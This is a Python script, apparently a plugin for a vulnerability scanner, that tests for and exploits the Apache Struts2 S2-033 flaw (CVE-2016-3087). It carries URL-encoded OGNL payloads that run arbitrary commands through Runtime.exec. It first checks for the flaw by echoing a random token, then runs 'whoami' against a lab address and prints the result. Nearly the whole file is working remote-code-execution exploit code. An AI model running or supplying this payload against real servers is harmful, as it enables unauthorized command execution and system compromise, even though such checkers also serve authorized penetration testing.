#!/usr/bin/env python3

'''
name: Struts2 S2-033漏洞，又名CVE-2016-3087漏洞
description: Struts2 S2-033漏洞可执行任意命令
'''

import re
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_033_BaseVerify:
    def __init__(self, url):
        self.url = url 
        self.capta = get_capta() 
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3"
                  }
        self.check_payload = '''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command=echo ''' + self.capta
        self.cmd_payload = '''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command=whoami'''
    
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url + self.check_payload, headers = self.headers)
            if self.capta in check_req.text:
                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                print('存在S2-033漏洞,执行whoami命令成功，结果为：', cmd_req.text)
                return True
            else:
                print('不存在S2-033漏洞!')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_033 = S2_033_BaseVerify('http://192.168.30.242:8080/S2-033/orders/3')
    S2_033.run()
